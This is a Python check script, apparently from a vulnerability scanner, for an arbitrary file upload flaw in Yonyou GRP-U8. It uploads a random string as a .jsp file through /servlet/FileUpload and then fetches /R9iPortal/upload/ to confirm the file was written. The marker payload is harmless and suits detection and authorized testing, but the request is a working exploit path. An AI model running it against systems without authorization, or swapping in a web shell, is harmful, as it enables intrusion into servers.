import requests
import urllib
from inc.generate_random import generate_random_str


def verify(url):
    relsult = {
        'name': '用友GRP-U8-FileUpload任意文件上传',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'Cache-Control': 'max-age=0',
        'Origin': 'null',
        'DNT': '1',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryA8Ee42FOAqdLah9L',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close'
    }
    char_data = generate_random_str(10)
    data = f'''------WebKitFormBoundaryA8Ee42FOAqdLah9L
    Content-Disposition: form-data; name="rfile_name"; filename="2.png"
    Content-Type: image/png

    {char_data}
    ------WebKitFormBoundaryA8Ee42FOAqdLah9L--'''

    char = generate_random_str(6)
    vurl = urllib.parse.urljoin(url, f"/servlet/FileUpload?fileName={char}.jsp&actionID=update")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200:
            vurl = url + f'/R9iPortal/upload/{char}.jsp'
            response = requests.get(vurl)
            if response.status_code == 200 and char_data in response.text:
                relsult['vulnerable'] = True
                relsult['verify'] = vurl
        return relsult

    except:
        return relsult

